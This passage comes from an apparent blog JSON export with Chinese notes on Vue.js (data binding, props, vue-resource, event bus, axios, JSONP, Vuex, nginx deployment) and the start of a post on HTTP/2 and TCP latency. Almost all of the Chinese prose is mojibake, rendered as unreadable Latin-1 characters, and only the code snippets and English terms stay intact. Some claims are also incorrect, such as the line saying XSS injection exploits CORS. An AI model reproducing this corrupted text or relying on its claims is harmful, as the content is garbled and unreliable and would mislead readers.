å¦‚æœcheckboxè¢«é€‰ä¸­ï¼Œblogçš„categoriesæ•°ç»„ä¸­å°±åŠ å…¥äº†è¿™ä¸ªå…ƒç´ ï¼Œå–æ¶ˆé€‰ä¸­åˆ™ä»æ•°ç»„ä¸­ç§»é™¤ã€‚ 1.4 Select Box BindingSelctBoxåªèƒ½å•é€‰ï¼Œç»‘å®šæ•°æ®è¿™æ ·: &lt;select v-model=&#39;blog.author&#39;&gt; &lt;option v-for=&#39;a in authors&#39; &gt;{{a}}&lt;/option&gt; &lt;/select&gt; data{ blog:{ author:&#39;default&#39; }, authors:[&#39;bob&#39;,&#39;Jessy&#39;,&#39;Jean&#39;,&#39;Jean&#39;,&#39;Dave&#39;] } SelectBoxä¼šä»authorsæ•°ç»„ä¸­æä¾›é€‰é¡¹ï¼Œé€‰ä¸­åï¼Œblog.authorå¯¹è±¡å°†ä¼šè¢«èµ‹äºˆç›¸åº”çš„å€¼ã€‚ 1.5 HTMLæ¨¡æ¿å¤ç”¨ç»„ä»¶çš„æ„ä¹‰å°±åœ¨äºå¯ä»¥å¤ç”¨UIå…ƒç´ ï¼Œå°±åƒFlaskçš„renderTemplateæ–¹æ³•é‡Œé¢å¯ä»¥æ¥æ”¶è‹¥å¹²å‚æ•°ï¼Œvue Componentä¹Ÿæ˜¯ä¸€æ · åœ¨çˆ¶Componentä¸­å¼•å…¥å­Component å­Componentä¸­æ·»åŠ props:[â€˜variable1â€™,â€™variable2â€™]æ•°ç»„ åœ¨çˆ¶æ§ä»¶ä¸­ç›´æ¥åœ¨htmlæ ‡ç­¾ä¸Šæ·»åŠ  :variable1 =â€™â€™ ï¼Œæ³¨æ„è¿™ä¸ªå†’å·å…¶å®æ˜¯ v-bind: çš„ç¼©å†™ï¼Œä¸èƒ½çœç•¥ åœ¨å­æ§ä»¶çš„htmlä¸­å°±åƒå¼•ç”¨dataä¸€æ ·ä½¿ç”¨props 1.6å„ç§å¼•ç”¨åœ¨vueç»„ä»¶ä¸­thisæŒ‡çš„æ˜¯å½“å‰çš„VueComponentï¼ˆä¹Ÿå°±æ˜¯å¸¸è¯´çš„vmï¼‰ï¼ŒselfæŒ‡çš„æ˜¯windowå¯¹è±¡ï¼Œthis.$elæŒ‡çš„æ˜¯æ‰€æ¸²æŸ“çš„template 1.7 åµŒå¥—è·¯ç”±ç ´åäº†é™æ€èµ„æºçš„å¼•ç”¨è·¯å¾„nested-routes-breaks-the-static-pathè§£å†³æ–¹æ³•æ˜¯åœ¨ htmlä¸­ç½®é¡¶cssæˆ–jsç­‰é™æ€èµ„æºçš„locationï¼Œä»ç»å¯¹è·¯å¾„ï¼Œæ ¹è·¯å¾„å¼€å§‹ 2.ä½¿ç”¨Httpè¿›è¡ŒCURDæ“ä½œå®‰è£…ï¼šRepoæ³¨æ„ï¼šéœ€è¦åœ¨å½“å‰å·¥ä½œç›®å½•.å®‰è£…å®Œæˆåœ¨package.jsonä¸­çœ‹åˆ° &quot;dependencies&quot;: { &quot;vue&quot;: &quot;^2.3.3&quot;, &quot;Vue-resource&quot;:&quot;^1.3.4&quot; }, ç±»ä¼¼è¿™æ ·å³å¯ã€‚ 2.1 è¿›è¡ŒPOSTæ“ä½œjsonPlaceHolderæ˜¯ä¸€ä¸ªå…è´¹çš„APIç½‘ç«™ã€‚vue-resourceæäº¤è¡¨å•çš„æ“ä½œå¦‚ä¸‹: post:function () { //use http here this.$http.post(&#39;https://jsonplaceholder.typicode.com/posts&#39;,{ title:this.blog.title, body:this.blog.content, userId:1, }).then(function (data) { // body... console.log(data) this.summited = true }); } postæ–¹æ³•è¿”å›çš„æ˜¯ä¸€ä¸ªpromiseï¼ŒåŠ å›è°ƒå³å¯æ‰“å°å‡ºapiè¿”å›ç»“æœã€‚ 3. Router,Eventbus,mixinï¼Œaxiosç­‰å®‰è£…: npm install vue-router â€“savenpm install vue-bus â€“save 3.1 å…³äºBusï¼Œ æ˜¯ç”¨æ¥åœ¨ä¸åŒçš„Vueæ–‡ä»¶ä¸­ä¼ é€’äº‹ä»¶(æ•°æ®)ç”¨çš„ï¼Œå®‰è£…å¥½åï¼Œmain.jsé‡Œé¢importå¹¶ä½¿ç”¨ import Vue from â€˜vueâ€™import VueBus from â€˜vue-busâ€™;Vue.use(VueBus); A.vueä¸­ created(){ this.$bus.emit(&#39;loadSuccess&#39;, &#39;åˆ›å»ºæˆåŠŸï¼&#39;); }, beforedestory(){ this.$bus.off(&#39;loadSuccess&#39;) } // B.vueä¸­ created(){ this.$bus.on(&#39;loadSuccess&#39;,text=&gt; { console.log(&#39;receieve msg from another vue component &#39;+ text) }) } 3.2 å…³äºmixinï¼Œæœ‰æ¯”è¾ƒå¥½çš„ä»‹ç»å…¶å®å°±æ˜¯æŠŠä¸€äº›å…¬ç”¨çš„methodsæ”¾åˆ°ä¸€ä¸ªjsæ–‡ä»¶ä¸­exportæ‰ï¼Œç„¶åéœ€è¦çš„vueæ–‡ä»¶ï¼Œè‡ªå·±å»importï¼Œåœ¨dataä¸­è®¾ç½®mixins: [] ,ä½¿ç”¨çš„æ—¶å€™å°±å¯ä»¥ç”¨this.method()ä½¿ç”¨è¿™äº›å…±æœ‰çš„æ–¹æ³•äº†ã€‚å…¶å®ä¸»è¦æ˜¯ä¸ºäº†å¤ç”¨ã€‚ 3.3 æ·»åŠ å…¨å±€å˜é‡(å¸¸é‡)çš„æ–¹æ³•ï¼Œvuexæ˜¯å®˜æ–¹çš„ 3.4 routerå°±æ˜¯å»ºç«‹internal link é¡µé¢ä¹‹é—´è·³è½¬çš„æ¡¥æ¢åœ¨templateä¸­æ·»åŠ router-linkçš„tag,ä¼šç”Ÿæˆä¸€ä¸ªå¯¹åº”çš„a Tag,ç‚¹å‡»è·³è½¬å³å¯ã€‚router-viewæ ‡ç­¾è¡¨ç¤ºé¢„å…ˆå‡†å¤‡å¥½çš„å¸ƒå±€ä¼šè¢«æ¸²æŸ“è¿›å…¥è¿™ä¸ªæ ‡ç­¾å†…ï¼ˆå°†å…¶å–ä»£ï¼‰ 3.5 axioså–ä»£vue-resourceç”¨äºå‘èµ·httpè¯·æ±‚å®‰è£…åœ¨å®˜æ–¹ä»‹ç»é¡µæœ‰ï¼Œå­ç»„ä»¶å¯ä»¥ä½¿ç”¨importä»mainjsé‡Œé¢æ‹¿åˆ°ã€‚å›åˆ°axiosï¼Œä½œè€…è¡¨ç¤ºä¸æ‰“ç®—æ”¯æŒjsonpï¼Œæƒ³ç”¨jsonpçš„è¯å¯ä»¥ç”¨jquery,æˆ–è€…ä½¿ç”¨jsonpæ’ä»¶ $ npm install jsonp --save var jsonp = require(&#39;jsonp&#39;); jsonp(&#39;http://api.douban.com/v2/movie/top250&#39;, null, function (err, data) { if (err) { console.error(err.message); } else { console.log(data); } }); äº²æµ‹æœ‰æ•ˆã€‚ take aways: ##åŒæºï¼š $.ajax({ url:&quot;persons.json&quot;, success:function(data){ console.log(data); //ToDo.. } }); ##è·¨åŸŸï¼š $.ajax({ url:&quot;http://www.B.com/open.php?callback=?&quot;, dataType:&quot;jsonp&quot;, success:function(data){ console.log(data); //ToDo.. } }); å…¶å®ä¸€å¼€å§‹æ²¡æœ‰callback=?è¿™äº›ä¸ªä¸œè¥¿çš„ï¼Œhttp://www.B.com/open.js è¿™ä¸ªé“¾æ¥å°±æ˜¯ä¸€ä¸ªç®€å•çš„js foo({&quot;name&quot;:&quot;B&quot;,&quot;age&quot;:23}); æ‰€ä»¥Aç½‘ç«™å¾€documenté‡Œé¢å†™ä¸€ä¸ªscriptä¹‹åï¼Œç›´æ¥å°±æ‰§è¡Œäº†Aç½‘ç«™çš„foo() functionã€‚ ä½†å‡å¦‚Bç½‘ç«™è¿˜å¯¹Cç½‘ç«™æä¾›æœåŠ¡ï¼ŒCç½‘ç«™è¯´foo()è¿™ä¸ªæ–¹æ³•åå·²ç»è¢«å ç”¨äº†ã€‚æ‰€ä»¥Bå°±çº¦å®šï¼Œä¸ç®¡æ˜¯A,B,C Då“ªå®¶ç½‘ç«™ï¼Œæƒ³è¦è°ƒå„è‡ªçš„ä»€ä¹ˆæ–¹æ³•è‡ªå·±ä¼ ä¸Šæ¥ï¼ŒBè´Ÿè´£è°ƒç”¨ä»¥ä¸‹ã€‚å› ä¸ºjsonpåªèƒ½æ˜¯GETï¼Œæ‰€ä»¥åªå¥½æ”¾åœ¨queryParametersé‡Œé¢äº†ã€‚ä¸ºä»€ä¹ˆå«callbackçš„åŸå› æˆ‘ä¹Ÿæ˜¯æœ€è¿‘æ‰æƒ³æ¸…æ¥šçš„ä¸Šé¢é‚£ä¸ªcallbackä¸ä¸€å®šéè¦å†™callbackï¼Œå…¶å®å†™ä»€ä¹ˆéƒ½è¡Œï¼Œä¸»è¦çœ‹å¯¹æ–¹ç½‘ç«™æ˜¯æ€ä¹ˆå®šä¹‰çš„ã€‚å°±æ˜¯å¯¹æ–¹è¿™ä¸ªé“¾æ¥æ˜¯æ€ä¹ˆæ‹¿è¿™ä¸ªurlé‡Œé¢çš„queryParamsçš„ã€‚ XSSæ³¨å…¥å°±æ˜¯åˆ©ç”¨äº†CORS 4. VuexåŠçŠ¶æ€ç®¡ç†åœ¨jsçœ¼ä¸­ï¼Œä¸€æ®µjsonå­—ç¬¦ä¸²å°±æ˜¯ä¸€ä¸ªobjectã€‚è¿™æ˜¯vuex ä¸­æ”¹å˜æŸé¡¹å±æ€§çš„ä»£ç ï¼š mutations: { increment (state, payload) { state.count += payload.amount } } store.commit(&#39;increment&#39;, { amount: 10 }) ä¸¤ä¸ªèŠ±æ‹¬å·æ‹¬èµ·æ¥çš„(json)ï¼Œæ‰æ˜¯å¯¹è±¡ã€‚è¿™é‡Œï¼Œå‡½æ•°åå«åš&#39;increment&#39;ï¼Œä¼ è¿›å»çš„payLoadå³æœ‰æ•ˆä¿¡æ¯ï¼Œæ˜¯é€šè¿‡jsonè½¬è¾¾çš„ã€‚ äº‹ä»¶å¤„ç†ç‚¹å‡»æ—¶ä¼šå‘ç”ŸMouseEvent,å¦‚æœæƒ³è¦è·å–è¿™é‡Œé¢çš„ä¸€äº›å±æ€§ï¼Œæ¯”å¦‚ç‚¹å‡»ä½ç½®screenX,ScreenYè¿™äº›ï¼Œå¯ä»¥åœ¨htmlä¸­ç»‘å®šäº‹ä»¶æ—¶ï¼Œä½¿ç”¨$eventè¿™ä¸ªç¬¦å·å°†äº‹ä»¶ä¼ é€’åˆ°æ–¹æ³•ä¸­ã€‚ åŸºç¡€å¤ä¹  idå’Œclassçš„é—®é¢˜html tagçš„classï¼Œä¸åŒtagå¯ä»¥æœ‰ç›¸åŒçš„classï¼Œå¼•ç”¨çš„æ—¶å€™ç”¨.classnameæ¥æŸ¥æ‰¾idè¿™ä¸ªtagå”¯ä¸€çš„ï¼Œä¸€ä¸ªé¡µé¢ä¸èƒ½æœ‰ä¸¤ä¸ªtagæœ‰ç›¸åŒçš„idï¼Œå¼•ç”¨çš„æ—¶å€™ç”¨#idæ¥æ‰¾ä¸€ä¸ªæ˜¯ç‚¹ï¼Œä¸€ä¸ªæ˜¯# js é‡Œé¢æœ‰ä¸€ä¸ªpromiseçš„æ¦‚å¿µï¼Œå’Œjava8çš„ä¸€äº›æµå¼ç†å¿µæœ‰ç‚¹åƒ å…³é—­ESlintï¼ŒEslintå®åœ¨æ˜¯å¤ªä¸¥æ ¼äº†ï¼Œæœ‰ç‚¹å¦¨ç¢å¼€å‘æ•ˆç‡ htmlä¸­audio tagä¸è¯†åˆ«æœ¬åœ°æ–‡ä»¶ï¼Œéœ€è¦æ”¾åœ¨staticæ–‡ä»¶ä¸‹ï¼Œæ”¾åœ¨srcæ–‡ä»¶å¤¹é‡Œå°±æ˜¯404ï¼Œä¸€å¼€å§‹çš„æ—¶å€™æˆ‘è¿™ä¹ˆå†™â€src=â€™../assets/èµµé›·-æˆéƒ½.mp3â€™â€ï¼Œæ­»æ´»æ”¾ä¸å‡ºæ¥ï¼Œæ¢æˆâ€file://â€œå¼€å¤´ä¹Ÿä¸è¡Œï¼Œæ¢æˆç½‘æ˜“äº‘éŸ³ä¹çš„httpåœ°å€å°±å¥½äº†ã€‚æœ€åæ¢æˆâ€™staticç›®å½•ä¸‹â€™ã€‚ç»ˆäºæ”¾å‡ºæ¥äº†ï¼Œâ€œè®©æˆ‘æ‰ä¸‹çœ¼æ³ªçš„æ˜¯ï¼Œç®€ç›´æ—¥äº†Xâ€ï¼Œè¿˜è›®æŠ¼éŸµçš„ã€‚ atomå¯ä»¥åŒæ—¶é¢„è§ˆä¸¤ä¸ªé€‰é¡¹å¡ï¼Œå³é”®,split rightï¼Œç”¨äºcopy and pasteæ¯”è¾ƒæ–¹ä¾¿ cssé‡Œé¢å¯ä»¥å†™â€background-image: url(./somefile.png)â€ï¼Œå°±æ˜¯ç›¸å¯¹è·¯å¾„çš„æ„æ€ã€‚ 10.cssé‡Œé¢çš„classç»§æ‰¿æ˜¯åŒæ—¶åœ¨ä¸€ä¸ªtagé‡Œé¢æ·»åŠ class=â€class_a class_bâ€ï¼Œä¸­é—´ä¸€ä¸ªç©ºæ ¼ï¼Œéœ€è¦ä»€ä¹ˆæ‹¿ä»€ä¹ˆ cssåˆ†ä¸‰ç§ï¼Œå¤–éƒ¨æ ·å¼è¡¨ï¼ˆå†™åœ¨å¦ä¸€ä¸ªcssæ–‡ä»¶é‡Œï¼‰ï¼Œå†…éƒ¨æ ·å¼è¡¨(å†™åœ¨header tagä¸­)å’Œå†…è”æ ·å¼è¡¨(å†™åœ¨å•ç‹¬çš„tagé‡Œé¢) æ—¥å¸¸å¼€å‘å‡ºé”™è®°å½• Vue warn]: Property or method is not defined on the instance but referenced during renderã€‚åŸæ¥æ˜¯templateé‡Œé¢çš„htmlæŸä¸ªå…ƒç´ é‡Œé¢è°ƒç”¨äº†XXXï¼Œè€Œè¿™ä¸ªXXXå¹¶æ²¡æœ‰åœ¨å½“å‰Vueå®ä¾‹ä¸­å£°æ˜ã€‚ Cannot read property â€˜stateâ€™ of undefined.è¿™å…¶å®å°±æ˜¯åœ¨vue componentä¸­è®¿é—®this.$store ===undefinesäº†ï¼Œéœ€è¦ç¡®ä¿Vueçš„å£°æ˜ä¸­// root instance new Vue({ // eslint-disable-line no-new el: &quot;#app&quot;, store, router, render: h =&gt; h(App) }) 3. ä½¿ç”¨nginxæ­å»ºæœ¬åœ°æœåŠ¡å™¨å®˜æ–¹è¯´nginxçš„windowsç‰ˆæœ¬åªä¾›æµ‹è¯•ä½¿ç”¨ï¼Œæ€§èƒ½ä¸æ€ä¹ˆæ ·ï¼Œä½†ç”¨äºå‰ç«¯éƒ¨ç½²è¿˜æ˜¯å¤Ÿç”¨çš„ã€‚å»nginxç½‘ç«™ä¸‹è½½windowsç‰ˆæœ¬çš„nginxï¼Œè§£å‹ç¼©ï¼ŒåŒå‡»å¯æ‰§è¡Œæ–‡ä»¶nginx.exeã€‚åœ¨è¿™ä¹‹å‰ï¼Œæœ€å¥½å…ˆæ‰“å¼€confæ–‡ä»¶å¤¹ï¼Œç¼–è¾‘nginx.confã€‚è®¾ç½®ä¸€ä¸‹ç«¯å£ï¼Œå› ä¸ºé»˜è®¤çš„80è¯´ä¸å®šå°±ç»™è°å ç”¨äº†ã€‚å…¶å®ç”¨å‘½ä»¤è¡Œä¹Ÿèƒ½å¯åŠ¨ï¼š start nginxtasklist /fi â€œimagename eq nginx.exeâ€ //è¿™ä¸ªæ˜¯windowsä¸‹æŸ¥çœ‹å½“å‰åœ¨è¿è¡Œçš„nginxçš„å‘½ä»¤nginx -s stop // ç«‹å³å…³é—­nginx -s quit // graceful shutdownè¿™äº›ä¸œè¥¿å®˜ç½‘ä¸Šéƒ½å†™å¾—å¾ˆæ˜ç™½ã€‚ ç”Ÿäº§ç¯å¢ƒéƒ¨ç½²å‰ç«¯é™æ€èµ„æºå¯ä»¥è¿™ä¹ˆè®¾ç½®ï¼Œå‚è€ƒçŸ¥ä¹çš„å›ç­” ç”¨vue-cliæ­å»ºçš„åšæ³•:1ã€npm run build2ã€æŠŠdisté‡Œçš„æ–‡ä»¶æ‰“åŒ…ä¸Šä¼ è‡³æœåŠ¡å™¨ ä¾‹ /data/www/ï¼Œæˆ‘ä¸€èˆ¬æŠŠindex.htmlæ”¾åœ¨staticé‡Œæ‰€ä»¥æˆ‘çš„æ–‡ä»¶è·¯å¾„ä¸ºï¼š/data/www/static|â€”â€“index.html|â€”â€“js|â€”â€“css|â€”â€“images â€¦.3ã€é…ç½®nginxç›‘å¬80ç«¯å£ï¼Œlocation /static alias åˆ° /data/www/staticï¼Œé‡å¯nginxlocation /static { alias /data/www/static/; }4ã€æµè§ˆå™¨è®¿é—®http://ip/static/index.htmlå³å¯ ä¸€äº›è½®å­better-scroll æ»´æ»´çš„å‘˜å·¥å†™çš„ å®˜æ–¹çš„åº“ Vuexæ˜¯è´Ÿè´£å…¨å±€çŠ¶æ€ç®¡ç†çš„ï¼Œå‚è€ƒ ç»„ä»¶é—´é€šä¿¡çš„æ–¹å¼ å‚è€ƒ Vue JS 2 Tutorial github repo jsonPlaceHoder css Sass JavaScript æ•™ç¨‹ ES6ç›¸å…³ cssæ•™ç¨‹ widgets 2018 æˆ‘æ‰€äº†è§£çš„ Vue çŸ¥è¯†å¤§å…¨ï¼ˆä¸€ï¼‰ ç”¨vueå†™ä¸€ä¸ªcalculatorçš„å°demo","tags":[{"name":"å‰ç«¯","slug":"å‰ç«¯","permalink":"https://haldir65.github.io/tags/å‰ç«¯/"},{"name":"javaScript","slug":"javaScript","permalink":"https://haldir65.github.io/tags/javaScript/"},{"name":"Vue","slug":"Vue","permalink":"https://haldir65.github.io/tags/Vue/"}]},{"title":"http2ç¬”è®°","date":"2017-09-01T06:52:35.000Z","path":"2017/09/01/2017-09-01-how-much-an-http-s-cost/","text":"httpå»ºç«‹åœ¨tcp,ipåŸºç¡€ä¸Šï¼Œtcpåè®®çš„å¯é æ€§æ„å‘³ç€æ¯æ¬¡httpè¯·æ±‚éƒ½ä¼šåˆ†è§£ä¸ºå¤šæ¬¡ipè¯·æ±‚ã€‚å¾ˆå¤šå‡ºäºbook keepingçš„ä¸œè¥¿å ç”¨äº†å®é™…å‘é€æ•°æ®çš„ç›¸å½“ä¸€éƒ¨åˆ†ï¼Œå…·ä½“å ç”¨å¤šå°‘ã€‚ç”±æ­¤é¡ºä¾¿å±•å¼€åˆ°httpå’Œtcpçš„åŸºæœ¬å…³ç³»ã€‚ å¤§éƒ¨åˆ†åŸºäºHadiåœ¨2016å¹´çš„æ¼”è®² 1. Httpçš„å‡ ä¸ªæ¦‚å¿µ1.1 bandwidthå’Œlatencyçš„æ¦‚å¿µbandwidthæ˜¯æŒ‡æ•°æ®ä¼ è¾“çš„é€Ÿåº¦ä¸Šé™ï¼ˆè¿è¥å•†è®¾ç½®ï¼‰ï¼Œlatencyæ˜¯ç‰©ç†è·ç¦»é™åˆ¶çš„ä¿¡å·ä¼ é€’åˆ°è¾¾çš„æ—¶é—´(ä¸­ç¾ä¹‹é—´çš„å»¶è¿Ÿä¸€èˆ¬180mså·¦å³ï¼Œè¿™æ˜¯ç‰©ç†è·ç¦»å†³å®šçš„)ã€‚ 1.2 ä¸ºä»€ä¹ˆhttp1.1å·®åŠ²è¿™æ˜¯ç”±äºlatencyå†³å®šçš„ï¼Œè·Ÿbandwidthæ— å…³ã€‚å‡è®¾å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´å­˜åœ¨ä¸€å®šå¸¦å®½é™åˆ¶ï¼Œéšç€å¸¦å®½ä¸Šé™çš„æé«˜ï¼Œä¸¤è€…ä¹‹é—´çš„ä¼ è¾“é€Ÿåº¦è¶‹äºå¹³è¡¡ã€‚åªæœ‰åœ¨è·¯ä¸å¤Ÿå®½çš„æ—¶å€™ï¼Œè·¯çš„å®½åº¦æ‰ä¼šæˆä¸ºäº¤é€šçš„é˜»ç¢ï¼Œå¦‚æœè·¯è¶³å¤Ÿå®½ï¼Œé‚£ä¹ˆé€šä¿¡åŒæ–¹çš„é€šä¿¡é€Ÿåº¦åªå’Œä¸¤è€…ä¹‹é—´çš„ç‰©ç†è·ç¦»æœ‰å…³ã€‚è¦å‘½çš„æ˜¯ï¼Œæ¯ä¸€æ¬¡è¿æ¥éƒ½å—åˆ°å»¶è¿Ÿå½±å“ã€‚ 1.3 ç°ä»£ç½‘ç«™çš„å¤æ‚åŒ–ç¨‹åº¦ä½¿å¾—ç½‘ç»œè¯·æ±‚è¶Šæ¥è¶Šé¢‘ç¹httpï¼ˆè¶…æ–‡æœ¬ä¼ è¾“åè®®ï¼‰ï¼Œæœ€åˆè®¾è®¡çš„æ—¶å€™ç¡®å®åªéœ€è¦ä¼ è¾“ä¸€äº›å›ºå®šçš„æ–‡å­—ï¼Œå¯èƒ½åªè¦ä¸€æ¡è¿æ¥å°±å¤Ÿäº†ã€‚éšç€ç°åœ¨ç½‘é¡µè¶Šæ¥è¶Šå¤æ‚ï¼Œæ‰“å¼€ä¸€ä¸ªç½‘é¡µï¼Œåœ¨chromeé‡Œé¢èƒ½çœ‹åˆ°ä¸€ç¬é—´è¯·æ±‚çš„èµ„æºå¤šè¾¾å‡ åä¸ªç”šè‡³ä¸Šç™¾ä¸ªã€‚æƒ³è±¡ä¸‹ï¼Œæ¯æ¡è¿æ¥éƒ½ä¼šå—åˆ°latencyçš„å½±å“ï¼Œæµªè´¹çš„æ—¶é—´æˆå€æ•°å¢é•¿ã€‚webpagetestå¯ä»¥å±•ç¤ºåŠ è½½ä¸€ä¸ªé¡µé¢çš„è¿‡ç¨‹ä¸­éƒ½å‘èµ·äº†å“ªäº›è¯·æ±‚ï¼Œå¹¶ä»¥waterfall viewçš„å½¢å¼å±•ç¤ºå‡ºæ¥ã€‚æ¯”ç›´æ¥åœ¨chromeé‡Œé¢çœ‹æ›´åŠ ç›´è§‚ã€‚ 1.4 ISO OSI Layerä¸€å…±ä¸ƒå±‚ Application (Httpåœ¨è¿™ä¸€å±‚ï¼Œä½†äººä»¬ä¹ æƒ¯æŠŠå®ƒå½“åšç¬¬å››å±‚) Presentation Session Transport (Tcpåœ¨è¿™) Network Link Physical Httpæœ¬èº«æ˜¯OKçš„ï¼Œtcpä¸ºäº†ç¡®ä¿å¯é æ€§ï¼Œå»ºç«‹è¿æ¥è¦ä¸‰æ¬¡æ¡æ‰‹ï¼Œæ–­å¼€è¿æ¥è¦å››æ¬¡æŒ¥æ‰‹ã€‚çœŸæ­£æœ‰ç”¨çš„æ•°æ®ä¼ è¾“åªåœ¨è¿™ä¸¤è€…ä¹‹é—´ã€‚æ¯æ¬¡å‘èµ·è¯·æ±‚ï¼Œéƒ½éœ€è¦å¸¦ä¸Šè¿™äº›å¿…è¦çš„æ•°æ®ä¼ è¾“ã€‚è¿™é‡Œé¢è¿˜æœ‰Handshakeï¼Œå®¢æˆ·ç«¯æ¯æ”¶åˆ°ä¸€ä¸ªåŒ…ï¼Œéƒ½è¦å‘æœåŠ¡ç«¯å‘Acknowledgement(ACK)ã€‚è¿˜æœ‰Flow Control(ä¸¤ç«¯ä¹‹é—´ä¼ è¾“æ•°æ®ï¼Œå®ç°å¹¶ä¸çŸ¥é“ä¸¤è€…ä¹‹é—´çš„é“è·¯æœ‰å¤šå®½ï¼Œæ‰€ä»¥å…ˆä¼ 100byteè¯•è¯•ï¼Œä¸€åˆ‡okåœ¨æåˆ°200byteï¼Œæ¥ç€æåˆ°500byte,ä¸‡ä¸€å‡ºç°é—®é¢˜ï¼Œé€€å›åˆ°200byte,è¿™å°±å«congestion)ã€‚Flow Controlçš„å­˜åœ¨æ˜¯æœ‰é“ç†ï¼Œä½†å´ä½¿å¾—æ¯ä¸€æ¡è¿æ¥éƒ½å¾—ä»å¾ˆå°çš„ä¼ è¾“é€Ÿåº¦è¿›è¡Œå°è¯•ï¼Œè¿™å°±é€ æˆäº†å»¶è¿Ÿçš„å¢å¤§ã€‚ 1.5 HTTP 0.9 å§‹äº 1991å¹´0.9ç‰ˆæœ¬çš„Httpè¿˜æ²¡æœ‰header,1996å¹´çš„Http 1.0 åŠ å…¥äº†Headerã€‚ä½†è¿™ç§åè®®çš„è®¾è®¡åˆè¡·å¹¶ä¸æ˜¯ä¸ºäº†ç°åœ¨è¿™ç§ä¸€ä¸ªç½‘é¡µå¸¦ä¸Š300ä¸ªè¯·æ±‚çš„äº‹å®è€Œè®¾è®¡çš„ã€‚ 1999å¹´ï¼Œhttp 1.1 åŠ å…¥äº†Connection closeï¼ˆé»˜è®¤æ˜¯Keep-Aliveï¼‰ã€‚Keep-Aliveçš„å¥½å¤„æ˜¯Tcpè¿æ¥ä¸ä¼šåœ¨ä¸€ä¸ªhttpè¯·æ±‚ç»“æŸä¹‹åå°±æ–­å¼€ï¼Œä¹Ÿå°±æ²¡æœ‰ä¸‰æ¬¡æ¡æ‰‹è¿™ç§ä¸œè¥¿äº†ã€‚ 1.6 ä¸€äº›å‰äººæ€»ç»“çš„ä¼˜åŒ–æŠ€å·§ Sigle connection (/index.htmlï¼›style.csså…¨éƒ½æ”¾åœ¨ä¸€ä¸ªè¿æ¥é‡Œé¢) Pipelining (ä¸€æ¬¡æ€§è¯·æ±‚index.htmlä»¥åŠstyle.cssï¼Œè¿™äº›ä¸œè¥¿å…¨éƒ½æ”¾åœ¨ä¸€ä¸ªè¯·æ±‚é‡Œé¢)ã€‚è¿™ç§æ–¹å¼çš„é—®é¢˜å«åš Head-of-line Blocking,ç”±äºtcpæ˜¯å¯é çš„åè®®ï¼Œæ‰€ä»¥å¿…é¡»å¾—ç­‰ç¬¬ä¸€ä¸ªè¯·æ±‚çš„responseå›æ¥ï¼Œåç»­çš„è¯·æ±‚æ‰èƒ½æ‰§è¡Œã€‚æ‰€ä»¥å¾ˆå¤šæµè§ˆå™¨åæ¥éƒ½æ”¾å¼ƒäº†å¯¹è¿™ç§æŠ€æœ¯çš„æ”¯æŒã€‚ äºæ˜¯äººä»¬å¼€å§‹ä¸€æ¬¡æ€§å‘å‡ºå¤šä¸ªtcpè¯·æ±‚ã€‚å®¢æˆ·ç«¯èƒ½åŒæ—¶å‘ä¸€ä¸ªhost(ä¸åŒhostä¹‹é—´ä¸å½±å“)å‘èµ·çš„è¯·æ±‚æœ€å¤š6(ä¸åŒæµè§ˆå™¨æ•°é‡ä¸åŒ)åˆ°8ä¸ªã€‚è¿™ä¹ˆå¹²çš„åŸå› ä¸€æ–¹é¢æ˜¯å®¢æˆ·ç«¯è‡ªæˆ‘ä¿æŠ¤ï¼Œå¦ä¸€æ–¹é¢ä¹Ÿæ˜¯ä¸ºäº†ä¿æŠ¤æœåŠ¡å™¨ä¸è‡³äºå´©æºƒã€‚å…·ä½“åœ¨çŸ¥ä¹ä¸Šæœ‰è®¨è®ºæ‰€ä»¥æˆ‘ä»¬ç»å¸¸çœ‹åˆ°çŸ¥ä¹æŠŠapiæ•°æ®æ”¾åœ¨zhihu.comä¸Šï¼Œå›¾ç‰‡æ”¾åœ¨zhimg.com,ç»Ÿè®¡æ”¾åœ¨zhstatic.comä¸Šã€‚æœ‰æ—¶å€™è¿˜ä¼šæœ‰pic2.zhimg.comï¼Œpic3.zhimg.comã€‚ã€‚ã€‚ç­‰ç­‰è¿™äº›ï¼Œè¿˜ä¸æ˜¯ä¸ºäº†åŠ å¿«ç½‘é¡µåŠ è½½é€Ÿåº¦ã€‚(è¿™å°±å«domain Sharding)ï¼Œè¿™ä¹ˆå¹²ä¹Ÿæœ‰åå¤„ï¼ŒMore DNS lookupsã€‚æ‰¾dnsèŠ±çš„æ—¶é—´å¤šäº†ã€‚ Inline resourcesç›´æ¥æŠŠå›¾ç‰‡æ”¾åœ¨htmlé‡Œé¢ä¼ å›æ¥ï¼Œè¿™é€ æˆç¼“å­˜å¤±æ•ˆã€‚è¿˜æœ‰ç¼–ç çš„é—®é¢˜ Concatenating and Spriting resourcesConcatenatingæ˜¯æŠŠæ‰€æœ‰çš„jsæ–‡ä»¶å¡åœ¨ä¸€ä¸ªå¤§çš„jsé‡Œé¢è¿”å›ï¼Œè¿™ä¹Ÿé€ æˆç¼“å­˜å¤±æ•ˆï¼Œå¤„ç†ç¼“æ…¢ç­‰é—®é¢˜ã€‚Spritingæ˜¯æŠŠä¸€å¤§å †å›¾ç‰‡æ”¾åœ¨ä¸€æ•´å¼ å›¾ç‰‡é‡Œé¢ï¼Œé€šè¿‡å¤æ‚çš„cssé€‰æ‹©å…¶ä¸­çš„å›¾ç‰‡ã€‚ ç®¡é“å’Œå¤šè·¯å¤ç”¨ 2. http2çš„å¼€å§‹Httpæœ‰ç‚¹åƒä¸€ç§è°ˆè¯å¼çš„åè®®ï¼Œä½†tcpå¹¶ä¸æ˜¯ã€‚httpå¹¶æ²¡æœ‰ä»€ä¹ˆé”™,æ…¢å°±æ…¢åœ¨tcphttp2çš„ä¸€äº›è¦ç‚¹å¦‚ä¸‹ Binary Communication(http1.X å°±æ˜¯å¾€socketé‡Œé¢å†™æ–‡å­—ï¼Œh2ç›´æ¥å†™binaryï¼Œ è§£æbinaryçš„é€Ÿåº¦è¦æ¯”è§£ææ–‡å­—å¿«) Compression and optimization techniques(GZipæ²¡æ³•å‹headerï¼Œh2å‹ç¼©äº†header) No change in HTTP semantics(ä¸»è¦æ˜¯ä¸ºäº†backward compatibilityï¼ŒGET,POSTè¿™äº›éƒ½æ²¡å˜) Not compatible with HTTP1.X but can be used ontop of it 2.1 SPDYè°·æ­Œè®¾è®¡äº†SPDYï¼Œh2å»ºç«‹åœ¨SPDYçš„åŸºç¡€ä¸Šï¼Œgoogleå·²ç»åºŸå¼ƒäº†SPDY,æ®è¯´æ˜¯ä¸ºäº†ç»™h2è®©è·¯ã€‚ 